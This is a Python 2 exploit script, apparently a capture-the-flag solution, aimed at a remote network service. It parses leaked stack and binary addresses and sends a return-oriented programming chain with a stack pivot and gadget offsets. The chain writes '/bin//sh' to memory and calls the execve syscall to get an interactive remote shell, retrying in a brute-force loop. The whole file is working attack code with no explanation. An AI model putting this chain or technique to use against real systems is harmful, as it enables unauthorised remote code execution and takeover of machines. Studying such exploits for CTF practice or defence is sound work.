import sys, socket, telnetlib
from struct import *
import random
import time
import binascii
import time
def recvuntil(t):
    p = ''
    while not p.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        p += tmp

    return p

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

bruteforce = 0
while 1:
	print "TRY NUMBER: " + str(bruteforce)
	bruteforce += 1
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], int(sys.argv[2])))

	print recvuntil("0")
	bufferApprox = recvuntil("\n")
	bufferApprox = bufferApprox[:-1]
	bufferApprox = int(bufferApprox,16)
	print "bufferApprox : " + hex(bufferApprox)
	print recvuntil("0")
	binaryApprox = recvuntil("\n")
	binaryApprox  = binaryApprox[:-1]
	binaryApprox = int(binaryApprox,16)
	print "binaryApprox : " + hex(binaryApprox)
	print recvuntil("? ")
	acc = bufferApprox + 0x030 #random offset.. 
	p = ''
	p += p64(acc + 8) #mov rbx, [rax]
	p += p64(acc + 8*2) #mov rcx, [rbx]
	p += p64(acc + 8*3) #mov rdx, [rcx]
	p += p64(binaryApprox - 0x20e675) #mov    rsp,rbx; mov    rbx,QWORD PTR [rsp]; add    rsp,0x30; ret
	p += "A"*24 #garbage""
	p += pack('<Q', binaryApprox-0x225000+0x0000000000000eb3) # pop rsi ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000223060) # @ .p
	p += pack('<Q', binaryApprox-0x225000+0x0000000000011104) # pop rax ; ret
	p += '/bin//sh'
	p += pack('<Q', binaryApprox-0x225000+0x0000000000012ab1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000000eb3) # pop rsi ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000223068) # @ .p + 8
	p += pack('<Q', binaryApprox-0x225000+0x0000000000019d95) # xor rax, rax ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000012ab1) # mov qword ptr [rsi], rax ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000001218) # pop rdi ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000223060) # @ .p
	p += pack('<Q', binaryApprox-0x225000+0x0000000000000eb3) # pop rsi ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000223068) # @ .p + 8
	p += pack('<Q', binaryApprox-0x225000+0x0000000000000d9a) # pop rdx ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000223068) # @ .p + 8
	p += pack('<Q', binaryApprox-0x225000+0x0000000000019d95) # xor rax, rax ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000001332)*59 # add al, 1 ; ret
	p += pack('<Q', binaryApprox-0x225000+0x0000000000019765) # syscall ; ret
	p += "\n"
	print len(p)
	s.send(hex(len(p))[2:] + "\n")
	print recvuntil("\n")
	s.send(p)
	print recvuntil("? ")
	s.send(hex(bufferApprox+0x030)[2:] + "\n")
	interactive()
	# s.send("A"*0x9ff+"\n")
	# interactive()
